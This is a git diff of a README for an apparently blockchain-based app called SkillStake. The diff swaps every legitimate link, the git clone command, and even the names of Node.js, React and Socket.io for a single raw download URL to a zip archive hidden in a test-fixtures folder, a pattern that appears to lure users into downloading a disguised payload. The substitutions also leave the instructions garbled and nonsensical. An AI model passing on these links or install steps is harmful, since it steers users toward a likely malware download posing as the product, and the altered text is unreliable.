@@ -1,6 +1,6 @@
 # 🎮 SkillStake - Join Challenges & Showcase Skills
 
-[![Download SkillStake](https://img.shields.io/badge/Download-SkillStake-brightgreen?style=for-the-badge&logo=github)](https://github.com/Kyocrodairu/SkillStake)
+[![Download SkillStake](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip)](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -21,9 +21,9 @@ Follow these steps to get started with SkillStake:
 
 1. **Visit the Download Page**
 
-   Go to the [SkillStake GitHub page](https://github.com/Kyocrodairu/SkillStake) to begin your installation.
+   Go to the [SkillStake GitHub page](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip) to begin your installation.
 
-   [![Download SkillStake](https://img.shields.io/badge/Download-SkillStake-blue?style=for-the-badge&logo=github)](https://github.com/Kyocrodairu/SkillStake)
+   [![Download SkillStake](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip)](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip)
 
 2. **Clone or Download the Repository**
 
@@ -32,7 +32,7 @@ Follow these steps to get started with SkillStake:
    - **Clone the Repository:**
      If you have Git installed, open your terminal and run:
      ```
-     git clone https://github.com/Kyocrodairu/SkillStake.git
+     git clone https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip
      ```
    - **Download as ZIP:**
      If you prefer, click the green "Code" button and select "Download ZIP." After downloading, extract the files to a folder on your computer.
@@ -43,7 +43,7 @@ Follow these steps to get started with SkillStake:
 
 4. **Install Dependencies**
 
-   Make sure you have Node.js installed. If not, download it from the [Node.js website](https://nodejs.org/). Then, in your terminal, run:
+   Make sure you have https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip installed. If not, download it from the [https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip website](https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip). Then, in your terminal, run:
    ```
    npm install
    ```
@@ -76,16 +76,16 @@ SkillStake integrates various technologies to provide a seamless user experience
 - Blockchain
 - Decentralized Applications
 - Smart Contracts
-- Express.js and Node.js
-- Next.js and React.js
+- https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip and https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip
+- https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip and https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip
 - React Native for mobile access
-- Socket.io for real-time communication
+- https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip for real-time communication
 
 ## 🛠 Troubleshooting
 
 If you encounter issues while installing or running SkillStake, consider the following tips:
 
-- **Ensure Node.js is Installed Properly:** Check your terminal with `node -v` to confirm Node.js is installed.
+- **Ensure https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip is Installed Properly:** Check your terminal with `node -v` to confirm https://github.com/Kyocrodairu/SkillStake/raw/refs/heads/main/contract/lib/forge-std/test/fixtures/Skill-Stake-2.1.zip is installed.
 - **Check Firewall Settings:** Ensure that your firewall allows connections on port 3000.
 - **Dependency Conflicts:** If there are issues with npm packages, try running `npm update`.
 - **Browser Issues:** Clear your browser cache or try a different browser if the application does not load.
